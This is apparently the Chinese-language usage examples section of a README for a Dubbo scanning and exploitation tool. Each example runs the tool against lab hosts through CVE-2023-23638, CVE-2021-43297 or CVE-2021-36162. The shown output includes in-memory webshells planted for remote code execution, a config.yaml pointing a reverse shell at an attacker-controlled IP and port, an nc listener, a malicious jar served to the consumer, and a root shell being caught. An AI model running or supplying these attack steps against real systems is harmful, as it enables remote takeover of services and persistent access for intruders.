# 测试示例

### 3.x dubbo provider

3.x dubbo provider 无需爆破方法，直接利用CVE-2023-23638完成RCE。

```bash
> cat target.txt
192.168.2.105:20880
```

```bash
> java -jar .\dubbo-scanner-1.0-SNAPSHOT-jar-with-dependencies.jar
21:39:18.093 [main] INFO  scanner.Main - ==================start detect==================
21:39:18.158 [main] INFO  scanner.Main -
【DubboInfo】
IP: 192.168.2.105
Group Name:demo-provider
version:3.x
services:
        interface:org.apache.dubbo.samples.api.GreetingsService
        port:20880

        interface:demo-provider/org.apache.dubbo.metadata.MetadataService
        version:1.0.0
        port:20880


21:39:18.159 [main] INFO  scanner.Main - ==================start scan==================
21:39:18.159 [main] INFO  scanner.Main - Check IP: 192.168.2.105 PORT: 20880 Service: dubbo
21:39:20.510 [main] INFO  scanner.exploit.DubboExploiter - [VULN] 192.168.2.105:20880 成功植入Dubbo内存马,执行whoami结果如下
21:39:20.510 [main] INFO  scanner.exploit.DubboExploiter - 执行命令结果:
desktop-0o8q0vi\root
```

### 2.7.x dubbo provider + 服务端dubbo telnet开启

2.7.x 的dubbo provider，当服务端开启了telnet命令时（低版本dubbo默认开启），程序会根据config.yaml中的爆破方法参数类型。利用CVE-2023-23638完成RCE。

```bash
> cat target.txt
192.168.2.105:20880
```

```bash
> java -jar .\dubbo-scanner-1.0-SNAPSHOT-jar-with-dependencies.jar
22:08:29.348 [main] INFO  scanner.Main - ==================start detect==================
22:08:29.435 [main] INFO  scanner.Main -
【DubboInfo】
IP: 192.168.2.105
version:2.x
services:
        interface:org.apache.dubbo.samples.api.GreetingsService
        methods:[{"name":"sayHi"}]
        port:20880


22:08:29.436 [main] INFO  scanner.Main - ==================start scan==================
22:08:29.436 [main] INFO  scanner.Main - Check IP: 192.168.2.105 PORT: 20880 Service: dubbo
22:08:31.799 [main] INFO  scanner.scan.DubboScaner - 找到可以利用的方法:
22:08:31.799 [main] INFO  scanner.scan.DubboScaner - org.apache.dubbo.samples.api.GreetingsService
22:08:31.799 [main] INFO  scanner.scan.DubboScaner - {"name":"sayHi"}
22:08:31.849 [main] INFO  scanner.exploit.DubboExploiter - [VULN] 192.168.2.105:20880 成功植入Dubbo内存马,执行whoami结果如下
22:08:31.849 [main] INFO  scanner.exploit.DubboExploiter - 执行命令结果:
desktop-0o8q0vi\root
```


### 2.7.x dubbo provider + zookeeper


当可以访问到dubbo的zookeeper注册中心时，无需爆破方法，即可找到方法和方法参数，利用CVE-2023-23638完成RCE。
```bash
> cat target.txt
192.168.2.105:20880
172.20.85.96:2181
```

```bash
> java -jar .\dubbo-scanner-1.0-SNAPSHOT-jar-with-dependencies.jar
22:11:48.065 [main] INFO  scanner.Main - ==================start detect==================
22:11:51.569 [main] INFO  scanner.Main -
【DubboInfo】
IP: 192.168.2.105
Group Name:demo-provider
version:2.7.15
services:
        interface:org.apache.dubbo.samples.api.GreetingsService
        methods:[{"name":"sayHi"}]
        port:20880


22:11:51.569 [main] INFO  scanner.Main - ==================start scan==================
22:11:51.569 [main] INFO  scanner.Main - Check IP: 192.168.2.105 PORT: 20880 Service: dubbo
22:11:53.679 [main] INFO  scanner.scan.DubboScaner - 找到可以利用的方法:
22:11:53.679 [main] INFO  scanner.scan.DubboScaner - org.apache.dubbo.samples.api.GreetingsService
22:11:53.680 [main] INFO  scanner.scan.DubboScaner - {"name":"sayHi"}
22:11:53.733 [main] INFO  scanner.exploit.DubboExploiter - [VULN] 192.168.2.105:20880 成功植入Dubbo内存马,执行whoami结果如下
22:11:53.733 [main] INFO  scanner.exploit.DubboExploiter - 执行命令结果:
desktop-0o8q0vi\root

22:11:53.734 [main] INFO  scanner.Main - Check IP: 172.20.85.96 PORT: 2181 Service: zookeeper
22:11:53.734 [main] INFO  scanner.scan.Scanner - 172.20.85.96:2181 无法被利用
```

### 2.7.x dubbo provider(<2.7.14)

当telnet关闭，或者程序禁用了爆破方法时，在小于2.7.14版本的dubbo上，无需方法和参数类型，利用CVE-2021-43297完成RCE，上传一个netty （目前仅在Linux部分版本可用，后续会优化）


### zookeeper

当程序可以访问zookeeper时，无需扫描provider和consumer即可发起攻击，利用CVE-2023-23638攻击provider，利用CVE-2021-36162攻击consumer。攻击consumer，需要正确配置config.yaml中的reverse字段，即可利用CVE-2021-36162指定目标访问恶意jar包，从而执行反弹shell。

```bash
> cat target.txt
172.20.85.96:2181

> cat config.yaml
timeout: 5
usuallyPorts:
  - 2181
  - 22222
  - 20880
methodParametersGuess: false
methodParametersGuessMaxLength: 3
methodParametersGuessList:
  - java.lang.Object
  - java.lang.Integer
  - java.util.Map
  - java.lang.String
reverse: #攻击consumer的回连shell地址
  shellIp: 172.20.85.96
  shellPort: 9999
  fileIp: 172.20.85.96
  filePort: 8888
#zookeeper:
#  username: admin
#  password: admin
#  scheme: auth

> nc -lvvp 9999
Listening on DESKTOP-0O8Q0VI 9999
```

```bash
> java -jar dubbo-scanner-1.0-SNAPSHOT-jar-with-dependencies.jar
23:32:00.026 [main] INFO  scanner.Main - ==================start detect==================
23:32:01.735 [main] INFO  scanner.Main -
【DubboInfo】
IP: 192.168.2.105
Group Name:demo-provider
version:2.7.12
services:
        interface:org.apache.dubbo.samples.api.GreetingsService
        methods:[{"parameterTypes":["java.lang.String"],"name":"sayHi","annotations":[],"parameters":[],"returnType":"java.lang.String"}]
        port:20880


23:32:01.735 [main] INFO  scanner.Main - ==================start scan==================
23:32:01.735 [main] INFO  scanner.Main - Check IP: 192.168.2.105 PORT: 20880 Service: dubbo
23:32:01.739 [main] INFO  scanner.exploit.DubboExploiter - 192.168.2.105:20880 尝试植入Dubbo内存马
23:32:02.904 [main] INFO  scanner.exploit.DubboExploiter - [VULN] 192.168.2.105:20880 成功植入Dubbo内存马,执行whoami结果如下
23:32:02.905 [main] INFO  scanner.exploit.DubboExploiter - 执行命令结果:
desktop-0o8q0vi\root

23:32:02.906 [main] INFO  scanner.Main - Check IP: 172.20.85.96 PORT: 2181 Service: zookeeper
23:32:02.922 [main] INFO  scanner.exploit.ZookeeperExploiter - HTTP 服务器已启动，监听端口:8888,等待3秒
23:32:02.923 [main] INFO  scanner.exploit.ZookeeperExploiter - 尝试注入demo-consumer
23:32:02.964 [pool-14-thread-1] INFO  s.e.ZookeeperExploiter$FileHandler - [VULN] 接受到请求来自:/172.20.80.1:5108请求路径:/3137322E32302E38352E39363A39393939.jar
23:32:05.928 [main] INFO  scanner.exploit.ZookeeperExploiter - HTTP Server关闭
```

```bash
root@DESKTOP-0O8Q0VI:~# nc -lvvp 9999
Listening on DESKTOP-0O8Q0VI 9999
Connection received on bogon 1943
whoami
desktop-0o8q0vi\root
```
